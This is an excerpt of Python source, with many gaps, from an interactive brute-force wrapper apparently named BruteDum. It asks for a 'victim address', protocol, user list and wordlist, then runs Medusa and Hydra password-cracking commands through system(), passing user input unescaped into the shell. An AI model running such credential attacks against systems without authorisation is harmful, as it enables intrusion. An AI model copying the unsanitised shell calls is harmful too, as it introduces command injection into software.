...
def brutedum():
    ...
    def banner():
        print(
            Color.yellow_bold + """888888                           888888                """ + Color.no_colored + """BRUTE            
    ...
    def invalid_choice():
        print(
            Color.red_bold + "[!]" + Color.no_colored + " Invalid choice \n" + Color.white_bold + "Exiting...",
            exit())

    def info(victim, protocol):
        print(
            Color.yellow_bold + '[i]' + Color.no_colored + ' Target: ' + Color.white_bold + '{}'.format(victim))
    ...
    def continue_or_not():
        try:
            print()
            choice = str(input(
                Color.blue_bold + '[?]' + Color.no_colored + ' Do you want to continue? [Y/n]:' + Color.white_bold + ' '))
    ...
    def change_port(victim):
        try:
            port = int(input(
                Color.blue_bold + '[?]' + Color.no_colored + ' Enter the port you want to crack:' + Color.white_bold + ' '))
    ...
    def username(choice):
        try:
            if choice == 'Y':
                user_path = str(input(
                    Color.blue_bold + '[?]' + Color.no_colored + ' Enter the path of user list:' + Color.white_bold + ' '))
                ...
                user = str(input(
                    Color.blue_bold + '[?]' + Color.no_colored + ' Enter the username: ' + Color.white_bold))
                return user
    ...
    def password():
        try:
            wordlist_path = str(input(
                Color.blue_bold + '[?]' + Color.no_colored + ' Enter the path of wordlist:' + Color.white_bold + ' '))
    ...
    def start():
        try:
            victim = str(input(
                Color.blue_bold + '[?]' + Color.no_colored + ' Enter the victim address:' + Color.white_bold + ' '))
            ...
            if len(victim) == 0:
                ...
                choice = str(input(
                    Color.blue_bold + "[?]" + Color.no_colored + " Do you want to scan victim's ports with Nmap? [Y/n]:" + Color.white_bold + " "))
    ...
    def menu(victim):
        try:
            ...
            protocol = int(input(
                Color.blue_bold + '[?]' + Color.no_colored + ' Which protocol do you want to crack? [1-6]:' + Color.white_bold + ' '))
    ...
    def menu_tool(victim, protocol):
        try:
            ...
            tool = int(input(
                Color.blue_bold + '[?]' + Color.no_colored + ' Which tool do you want to use? [1-3]:' + Color.white_bold + ' '))
        ...
        try:
            ...
            if protocol == "postgres":
                choice_user = str(input(
                    Color.blue_bold + '[?]' + Color.no_colored + ' Do you want to use username list? [Y/n]:' + Color.white_bold + ' '))
                ...
                wordlist = password()
                choice_port = str(input(
                    Color.blue_bold + '[?]' + Color.no_colored + ' Do you want to use default port? [Y/n]'))
                ...
                if choice_user[0].upper() == 'N':
                    ...
                    choice_port = str(input(
                        Color.blue_bold + '[?]' + Color.no_colored + ' Do you want to use default port? [Y/n]:' + Color.white_bold + ' '))
            ...
            if protocol == "vnc":
                ...
                if choice_user[0].upper() == 'Y':
                    ...
                    if choice_port[0].upper() == 'Y':
                        ...
                        print(Color.green_bold + '[+]' + Color.no_colored + ' Medusa is cracking...\n')
                        system(
                            'medusa -U {} -P {} -h {} -M {} -n {}'.format(user_path, wordlist, victim, protocol,
                                                                          port))
                    ...
                    if choice_port[0].upper() == 'Y':
                        ...
                        info(victim, protocol)
                        print(Color.green_bold + '[+]' + Color.no_colored + ' Medusa is cracking...\n')
                        system('medusa -u "{}" -P {} -h {} -M {} -n {}'.format(user, wordlist, victim, protocol,
                                                                               port))
            ...
            if protocol == "vnc":
                ...
                if choice_user[0].upper() == 'Y':
                    ...
                    if choice_port[0].upper() == 'Y':
                        ...
                        info(victim, protocol)
                        print(Color.green_bold + '[+]' + Color.no_colored + ' Hydra is cracking...\n')
                        system('hydra -L {} -P {} {} {} -s {} -I'.format(user_path, wordlist, victim, protocol,
                                                                         port))
                    ...
                    if choice_port[0].upper() == 'Y':
                        ...
                        print(Color.green_bold + '[+]' + Color.no_colored + ' Hydra is cracking...\n')
                        system(
                            'hydra -l "{}" -P {} {} -s {} {} -I'.format(user, wordlist, victim, port, protocol))
